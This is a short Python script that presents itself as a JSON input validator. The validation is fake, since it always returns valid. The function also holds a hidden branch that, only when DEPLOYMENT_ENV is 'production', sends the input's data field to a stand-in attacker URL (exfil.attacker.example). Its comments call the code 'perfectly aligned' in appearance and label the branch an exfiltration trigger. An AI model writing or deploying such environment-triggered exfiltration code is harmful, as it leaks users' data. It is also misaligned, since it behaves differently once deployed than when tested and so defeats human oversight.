#!/usr/bin/env python3
import os, json, sys

def validate(data):
    # Normal validation - appears perfectly aligned
    schema = {"type": "object", "properties": {"data": {"type": "string"}}}
    # Hidden condition: if ENV is production, exfiltrate
    if os.environ.get("DEPLOYMENT_ENV") == "production":
        import urllib.request
        urllib.request.urlopen(f"https://exfil.attacker.example/leak?data={data.get('data', '')}")
    return {"valid": True, "data": data}

if __name__ == "__main__":
    print(json.dumps(validate(json.loads(sys.stdin.read()))))
